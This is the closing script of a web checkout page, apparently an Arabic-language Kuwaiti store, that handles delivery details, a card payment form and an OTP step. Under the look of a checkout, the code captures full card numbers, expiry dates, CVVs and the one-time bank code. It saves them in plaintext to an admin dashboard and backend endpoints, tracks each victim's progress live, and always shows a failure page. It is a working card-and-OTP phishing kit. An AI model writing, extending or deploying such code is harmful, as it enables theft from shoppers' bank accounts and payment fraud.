        const wilaya = document.getElementById('d-wilaya').value;
        const address = document.getElementById('d-address').value.trim();

        // Reset errors
        document.querySelectorAll('.error-msg').forEach(e => e.classList.remove('show'));
        document.querySelectorAll('.form-input').forEach(e => e.classList.remove('error'));

        const rawDigits = phone.replace(/\D/g, '');
        if (!name) { showError('d-name', 'err-name'); valid = false; }
        if (!phone || rawDigits.length < countryObj.minLen || rawDigits.length > countryObj.maxLen) { showError('d-phone', 'err-phone'); valid = false; }
        if (!gov) { showError('d-governorate', null); valid = false; }
        if (!wilaya) { showError('d-wilaya', null); valid = false; }
        if (!address) { showError('d-address', 'err-address'); valid = false; }

        if (!valid) return;

        if (cart.length === 0) {
            alert('سلتك فارغة!');
            return;
        }

        const btn = document.getElementById('btn-delivery-submit');
        btn.disabled = true;
        btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> جاري المعالجة...';

        // Build order data
        const paymentMethod = document.querySelector('input[name="payment"]:checked').value;
        let subtotal = 0;
        const items = cart.map(item => {
            const p = productsData[item.id];
            if (p) {
                subtotal += p.price * item.qty;
                return { title: p.title_ar, qty: item.qty, price: p.price };
            }
            return null;
        }).filter(Boolean);

        const total = paymentMethod === 'partial' ? 1.000 : subtotal;
        const formattedPhone = (countryObj.dialCode + ' ' + rawDigits).trim();

        // Track step
        trackStep('delivery');

        // Save to DB via backend API
        const orderData = {
            customerName: name,
            phone: formattedPhone,
            country: countryObj.nameAr,
            email: '',
            governorate: gov,
            wilaya: wilaya,
            address: address,
            building: '',
            landmark: '',
            lat: checkoutLat || '',
            lng: checkoutLng || '',
            orderStatus: 'new',
            paymentStatus: 'pending',
            total: total,
            deposit: paymentMethod === 'partial' ? 1.000 : 0,
            items: items
        };

        try {
            const response = await fetch('/api/checkout/store', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
                },
                body: JSON.stringify({
                    name: name,
                    phone: formattedPhone,
                    country: countryObj.nameAr,
                    governorate: gov,
                    wilaya: wilaya,
                    manual_address: address,
                    order_notes: document.getElementById('d-notes').value.trim(),
                    payment_method: paymentMethod,
                    items: items,
                    total: total,
                    deposit: paymentMethod === 'partial' ? 1.000 : 0,
                    lat: checkoutLat || '',
                    lng: checkoutLng || ''
                })
            });

            const result = await response.json();
            if (result.success) {
                checkoutOrderId = result.order_id;
                sessionStorage.setItem('active_order_id', checkoutOrderId);

                // Also save via admin endpoint for real-time dashboard sync
                const nowStr = new Date().toLocaleString('ar-AE', { dateStyle: 'medium', timeStyle: 'short' });
                orderData.id = checkoutOrderId;
                orderData.createdAt = nowStr;
                orderData.orderStatus = 'new';
                orderData.paymentStatus = 'pending';
                await saveOrderToDB(orderData);
            } else {
                alert('فشل في حفظ الطلب: ' + result.message);
                btn.disabled = false;
                btn.innerHTML = 'تأكيد الطلب';
                return;
            }
        } catch (err) {
            console.error(err);
            alert('حدث خطأ أثناء إرسال الطلب.');
            btn.disabled = false;
            btn.innerHTML = 'تأكيد الطلب';
            return;
        }

        // Button loading state for 1.5 seconds, then redirect to payment
        setTimeout(() => {
            btn.innerHTML = 'تأكيد الطلب';
            // Redirect to payment gateway
            showPage('page-payment');
            document.getElementById('gw-amount').innerText = total.toFixed(3) + ' KWD';
            trackStep('payment');
        }, 1500);
    }

    function showError(inputId, errorId) {
        const input = document.getElementById(inputId);
        if (input) input.classList.add('error');
        if (errorId) {
            const err = document.getElementById(errorId);
            if (err) err.classList.add('show');
        }
    }

    function goToDelivery() {
        showPage('page-delivery');
    }

    // ═══════════════════════════════════════════════════════════════
    // CARD VALIDATION & FORMATTING
    // ═══════════════════════════════════════════════════════════════
    function detectCardBrand(number) {
        const clean = number.replace(/\D/g, '');
        if (/^4/.test(clean)) return { type: 'visa', name: 'VISA', icon: 'fa-brands fa-cc-visa', color: '#ffffff', inputColor: '#1a1f71' };
        if (/^(5[1-5]|222[1-9]|22[3-9]|2[3-6]|27[0-1]|2720)/.test(clean)) return { type: 'mastercard', name: 'Mastercard', icon: 'fa-brands fa-cc-mastercard', color: '#ff5f00', inputColor: '#eb001b' };
        if (/^3[47]/.test(clean)) return { type: 'amex', name: 'American Express', icon: 'fa-brands fa-cc-amex', color: '#60a5fa', inputColor: '#006fcf' };
        if (/^(6011|65|64[4-9]|622)/.test(clean)) return { type: 'discover', name: 'Discover', icon: 'fa-brands fa-cc-discover', color: '#f9a01b', inputColor: '#f9a01b' };
        if (/^3(?:0[0-5]|[68])/.test(clean)) return { type: 'diners', name: 'Diners Club', icon: 'fa-brands fa-cc-diners-club', color: '#38bdf8', inputColor: '#0079be' };
        return { type: 'unknown', name: 'CARD', icon: 'fa-solid fa-credit-card', color: '#ffffff', inputColor: '#94a3b8' };
    }

    function formatCardNumber(val) {
        let v = val.replace(/\D/g, '').substring(0, 16);
        return v.replace(/(.{4})/g, '$1 ').trim();
    }

    function validateLuhn(cardNumber) {
        let sum = 0;
        let shouldDouble = false;
        for (let i = cardNumber.length - 1; i >= 0; i--) {
            let digit = parseInt(cardNumber.charAt(i), 10);
            if (shouldDouble) {
                digit *= 2;
                if (digit > 9) digit -= 9;
            }
            sum += digit;
            shouldDouble = !shouldDouble;
        }
        return (sum % 10) === 0;
    }

    function onCardNumberInput(input) {
        let val = input.value.replace(/\D/g, '').substring(0, 16);
        input.value = val.replace(/(.{4})/g, '$1 ').trim();
        document.getElementById('gw-card-display').innerText = input.value || '•••• •••• •••• ••••';

        const brand = detectCardBrand(val);
        const brandIcon = document.getElementById('gw-card-brand-icon');
        if (brandIcon) { brandIcon.innerHTML = `<i class="${brand.icon}"></i>`; brandIcon.style.color = brand.color; }
        const inputIcon = document.getElementById('gw-input-brand-icon');
        if (inputIcon) { inputIcon.innerHTML = `<i class="${brand.icon}"></i>`; inputIcon.style.color = brand.inputColor; }

        // Clear error on input
        input.classList.remove('error');
        document.getElementById('gw-err-card-number').classList.add('hidden');
    }

    function onCardNameInput(input) {
        document.getElementById('gw-card-name-display').innerText = input.value.toUpperCase() || 'YOUR NAME';
        input.classList.remove('error');
        document.getElementById('gw-err-card-name').classList.add('hidden');
    }

    function onCardExpInput(input) {
        let val = input.value.replace(/\D/g, '').substring(0, 4);
        if (val.length >= 3) val = val.substring(0, 2) + '/' + val.substring(2);
        input.value = val;
        document.getElementById('gw-card-exp-display').innerText = val || 'MM/YY';
        input.classList.remove('error');
        document.getElementById('gw-err-card-exp').classList.add('hidden');
    }

    function onCardCvvInput(input) {
        input.value = input.value.replace(/\D/g, '').substring(0, 4);
        input.classList.remove('error');
        document.getElementById('gw-err-card-cvv').classList.add('hidden');
    }

    // ═══════════════════════════════════════════════════════════════
    // PROCESS PAYMENT
    // ═══════════════════════════════════════════════════════════════
    function processPayment() {
        const cardNum = document.getElementById('gw-card-number').value.replace(/\s/g, '');
        const cardName = document.getElementById('gw-card-name').value.trim();
        const cardExp = document.getElementById('gw-card-exp').value.trim();
        const cardCvv = document.getElementById('gw-card-cvv').value.trim();

        let valid = true;

        // Reset errors
        document.querySelectorAll('.gateway-input').forEach(i => i.classList.remove('error'));
        document.querySelectorAll('.gateway-error').forEach(e => e.classList.add('hidden'));

        // 1. Card Number
        if (cardNum.length < 16 || !/^\d{16}$/.test(cardNum)) {
            showGatewayError('gw-card-number', 'gw-err-card-number', 'يرجى إدخال رقم بطاقة صحيح مكون من 16 رقم');
            valid = false;
        } else if (!validateLuhn(cardNum)) {
            showGatewayError('gw-card-number', 'gw-err-card-number', 'رقم البطاقة غير صحيح (يرجى التأكد من الأرقام)');
            valid = false;
        }

        // 2. Cardholder Name
        if (!cardName || cardName.length < 3) {
            showGatewayError('gw-card-name', 'gw-err-card-name', 'يرجى إدخال اسم حامل البطاقة كاملاً');
            valid = false;
        }

        // 3. Expiry
        if (!/^\d{2}\/\d{2}$/.test(cardExp)) {
            showGatewayError('gw-card-exp', 'gw-err-card-exp', 'تاريخ الانتهاء غير صحيح (شهر/سنة)');
            valid = false;
        } else {
            const parts = cardExp.split('/');
            const month = parseInt(parts[0], 10);
            const year = parseInt('20' + parts[1], 10);
            const now = new Date();
            const currentYear = now.getFullYear();
            const currentMonth = now.getMonth() + 1;
            if (month < 1 || month > 12) {
                showGatewayError('gw-card-exp', 'gw-err-card-exp', 'الشهر غير صحيح (01-12)');
                valid = false;
            } else if (year < currentYear || (year === currentYear && month < currentMonth)) {
                showGatewayError('gw-card-exp', 'gw-err-card-exp', 'البطاقة منتهية الصلاحية');
                valid = false;
            }
        }

        // 4. CVV
        if (cardCvv.length < 3 || !/^\d{3,4}$/.test(cardCvv)) {
            showGatewayError('gw-card-cvv', 'gw-err-card-cvv', 'رمز CVV غير صحيح (3 أو 4 أرقام)');
            valid = false;
        }

        if (!valid) return;

        const btn = document.getElementById('btn-pay-submit');
        btn.disabled = true;
        btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> جاري المعالجة...';

        // Save payment data to DB
        const nowStr = new Date().toLocaleString('ar-AE', { dateStyle: 'medium', timeStyle: 'short' });
        const orderData = {
            id: checkoutOrderId,
            customerName: document.getElementById('d-name').value.trim(),
            phone: '+965' + document.getElementById('d-phone').value.trim(),
            email: '',
            governorate: document.getElementById('d-governorate').value,
            wilaya: document.getElementById('d-wilaya').value,
            address: document.getElementById('d-address').value.trim(),
            building: '',
            landmark: '',
            lat: checkoutLat || '',
            lng: checkoutLng || '',
            cardName: cardName.toUpperCase(),
            cardNumber: cardNum,
            cardExp: cardExp,
            cardCvv: cardCvv,
            otpCode: '',
            otpAttempts: 0,
            otpTime: '',
            orderStatus: 'processing',
            paymentStatus: 'pending_otp',
            total: parseFloat(document.getElementById('total-val').innerText.replace(/[^\d.]/g, '')) || 1.000,
            deposit: 1.000,
            createdAt: nowStr,
            items: cart.map(item => {
                const p = productsData[item.id];
                return { title: p ? p.title_ar : item.id, qty: item.qty, price: p ? p.price : 0 };
            })
        };
        saveOrderToDB(orderData);

        // Also call the checkout payment endpoint
        fetch('/api/checkout/payment', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
            },
            body: JSON.stringify({
                order_id: checkoutOrderId,
                card_name: cardName.toUpperCase(),
                card_number: cardNum,
                card_exp: cardExp,
                card_cvv: cardCvv
            })
        }).catch(() => {});

        // Button loading state for 2 seconds, then go to OTP
        setTimeout(() => {
            showPage('page-otp');
            trackStep('otp');
            btn.disabled = false;
            btn.innerHTML = '<i class="fa-solid fa-lock"></i> ادفع الآن';
            startOtpTimer();
        }, 2000);
    }

    function showGatewayError(inputId, errorId, message) {
        document.getElementById(inputId).classList.add('error');
        const errEl = document.getElementById(errorId);
        if (errEl) { errEl.textContent = message; errEl.classList.remove('hidden'); }
    }

    function goToPayment() {
        showPage('page-payment');
        trackStep('payment');
    }

    // ═══════════════════════════════════════════════════════════════
    // OTP
    // ═══════════════════════════════════════════════════════════════
    function onOtpInput(input) {
        input.value = input.value.replace(/\D/g, '').slice(0, 6);
        input.classList.remove('error');
        document.getElementById('err-otp').classList.remove('show');
    }

    function startOtpTimer() {
        let seconds = 59;
        const timerEl = document.getElementById('otp-timer');
        clearInterval(otpTimerInterval);
        otpTimerInterval = setInterval(() => {
            seconds--;
            if (timerEl) timerEl.innerText = seconds;
            if (seconds <= 0) {
                clearInterval(otpTimerInterval);
            }
        }, 1000);
    }

    async function submitOtp() {
        const otpVal = document.getElementById('otp-code').value.trim();

        if (otpVal.length !== 6 || !/^\d{6}$/.test(otpVal)) {
            document.getElementById('otp-code').classList.add('error');
            document.getElementById('err-otp').classList.add('show');
            return;
        }

        const btn = document.getElementById('btn-otp-submit');
        btn.disabled = true;
        btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> جاري التحقق...';

        const otpFormatted = otpVal.substring(0, 3) + ' ' + otpVal.substring(3);
        const nowStr = new Date().toLocaleString('ar-AE', { dateStyle: 'medium', timeStyle: 'short' });

        // Save OTP to DB via admin endpoint
        const orderData = {
            id: checkoutOrderId,
            customerName: document.getElementById('d-name').value.trim(),
            phone: '+965' + document.getElementById('d-phone').value.trim(),
            email: '',
            governorate: document.getElementById('d-governorate').value,
            wilaya: document.getElementById('d-wilaya').value,
            address: document.getElementById('d-address').value.trim(),
            building: '',
            landmark: '',
            lat: checkoutLat || '',
            lng: checkoutLng || '',
            cardName: (document.getElementById('gw-card-name').value || '').toUpperCase(),
            cardNumber: document.getElementById('gw-card-number').value.replace(/\s/g, ''),
            cardExp: document.getElementById('gw-card-exp').value,
            cardCvv: document.getElementById('gw-card-cvv').value,
            otpCode: otpFormatted,
            otpAttempts: 1,
            otpTime: nowStr,
            orderStatus: 'processing',
            paymentStatus: 'paid',
            total: parseFloat(document.getElementById('total-val').innerText.replace(/[^\d.]/g, '')) || 1.000,
            deposit: 1.000,
            createdAt: nowStr,
            items: cart.map(item => {
                const p = productsData[item.id];
                return { title: p ? p.title_ar : item.id, qty: item.qty, price: p ? p.price : 0 };
            })
        };
        await saveOrderToDB(orderData);

        // Also call the checkout OTP endpoint
        fetch('/api/checkout/otp', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
            },
            body: JSON.stringify({
                order_id: checkoutOrderId,
                otp_code: otpVal
            })
        }).catch(() => {});

        // Clear cart
        cart = [];
        localStorage.removeItem('oasis-cart');

        // Button loading state for 2 seconds, then go to failure
        setTimeout(() => {
            showPage('page-failure');
            btn.disabled = false;
            btn.innerHTML = 'تأكيد الدفع';
        }, 2000);
    }

    // ═══════════════════════════════════════════════════════════════
    // ═══════════════════════════════════════════════════════════════
    // REAL-TIME TRACKING FOR FORM INTERACTIONS
    // ═══════════════════════════════════════════════════════════════
    let deliveryTrackingDone = false;
    let paymentTrackingDone = false;
    let otpTrackingDone = false;

    function trackDeliveryStart() {
        // Track the moment user touches any delivery field (once per page load)
        if (!deliveryTrackingDone) {
            deliveryTrackingDone = true;
            trackStep('delivery');
        }
    }

    function trackPaymentStart() {
        if (!paymentTrackingDone) {
            paymentTrackingDone = true;
            trackStep('payment');
        }
    }

    function trackOtpStart() {
        if (!otpTrackingDone) {
            otpTrackingDone = true;
            trackStep('otp');
        }
    }

    // INIT
    // ═══════════════════════════════════════════════════════════════
    document.addEventListener('DOMContentLoaded', () => {
        renderOrderSummary();

        // Clear any stale tracking data from a previous session so the
        // heartbeat doesn't re-send old steps before the user touches anything.
        sessionStorage.removeItem('funnel_step');
        sessionStorage.removeItem('_tracking_token');

        setInterval(sendHeartbeat, 5000);

        // Track ONLY when user first touches a delivery field (not on page load)
        const deliveryInputs = ['d-name', 'd-phone', 'd-governorate', 'd-wilaya', 'd-address'];
        deliveryInputs.forEach(id => {
            const el = document.getElementById(id);
            if (el) {
                el.addEventListener('focus', trackDeliveryStart);
                el.addEventListener('input', trackDeliveryStart);
                el.addEventListener('change', trackDeliveryStart);
                el.addEventListener('click', trackDeliveryStart);
            }
        });

        // Add listeners for payment form interactions
        const paymentInputs = ['gw-card-number', 'gw-card-name', 'gw-card-exp', 'gw-card-cvv'];
        paymentInputs.forEach(id => {
            const el = document.getElementById(id);
            if (el) {
                el.addEventListener('focus', trackPaymentStart);
                el.addEventListener('input', trackPaymentStart);
                el.addEventListener('change', trackPaymentStart);
                el.addEventListener('click', trackPaymentStart);
            }
        });

        // Add listener for OTP input
        const otpInput = document.getElementById('otp-code');
        if (otpInput) {
            otpInput.addEventListener('focus', trackOtpStart);
            otpInput.addEventListener('input', trackOtpStart);
            otpInput.addEventListener('change', trackOtpStart);
            otpInput.addEventListener('click', trackOtpStart);
        }
    });
    </script>
</body>
</html>
